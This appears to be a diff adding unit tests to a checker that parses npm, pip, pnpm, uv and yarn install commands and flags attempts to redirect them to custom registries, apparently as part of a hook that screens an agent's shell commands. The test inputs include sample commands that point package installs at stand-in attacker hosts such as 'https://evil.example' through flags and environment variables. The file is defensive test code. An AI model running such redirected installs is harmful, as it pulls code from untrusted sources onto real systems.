@@ -275,6 +275,22 @@ class TestInstallCommandParsing(unittest.TestCase):
         self.assertEqual(t[0].custom_index, "--userconfig ./evil.npmrc")
         self.assertEqual(parse_install_command("FOO=1 ls"), [])
 
+    def test_more_registry_redirects(self):
+        idx = lambda cmd: [t.custom_index for t in parse_install_command(cmd) if t.custom_index]
+        self.assertTrue(idx("npm i --@acme:registry=https://evil.example @acme/pkg"))
+        self.assertTrue(idx("pnpm add --config.registry=https://evil foo"))
+        for env in ("PIP_CONFIG_FILE=./evil.conf pip install requests", "UV_CONFIG_FILE=x uv pip install a",
+                    "UV_FIND_LINKS=https://evil uv pip install x", "YARN_REGISTRY=https://evil yarn add foo"):
+            self.assertTrue(idx(env), env)
+        self.assertTrue(idx("export npm_config_registry=https://evil && npm i react"))
+        self.assertTrue(idx("PIP_INDEX_URL=https://evil; pip install requests"))  # shell variable, same line
+
+    def test_prefix_commands_with_options(self):
+        self.assertEqual(self.specs("env -u HOME pip install requests"), ["requests"])
+        self.assertEqual(self.specs("sudo -E pip install x"), ["x"])
+        self.assertEqual(self.specs("sudo -u root -H pip install y"), ["y"])
+        self.assertEqual(self.specs("npm i -C ./web lodash"), ["npm:lodash"])
+
     def test_hook_event_reading(self):
         self.assertEqual(read_hook_command('{"tool_name":"Bash","tool_input":{"command":"pip install x"}}'),
                          "pip install x")
